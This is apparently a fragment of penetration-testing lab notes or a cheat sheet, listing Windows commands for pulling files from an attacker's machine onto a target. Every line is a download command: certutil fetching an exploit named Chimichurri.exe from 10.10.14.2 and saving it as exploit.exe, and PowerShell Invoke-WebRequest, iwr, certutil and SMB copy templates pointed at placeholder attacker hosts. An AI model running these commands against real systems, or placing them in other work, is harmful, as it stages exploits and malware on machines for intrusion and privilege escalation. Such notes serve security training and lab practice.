```bash
certutil -urlcache -f http://10.10.14.2:8000/Chimichurri.exe exploit.exe
```
![image](https://github.com/user-attachments/assets/0e89cadd-d41c-471d-9dae-8fc0d7a61cde)

## Download
```bash
powershell -command Invoke-WebRequest -Uri http://<LHOST>:<LPORT>/<FILE> -Outfile C:\\temp\\<FILE>
```
```bash
iwr -uri http://lhost/file -Outfile file
```
```bash
certutil -urlcache -split -f "http://<LHOST>/<FILE>" <FILE>
```
```bash
copy \\kali\share\file .
```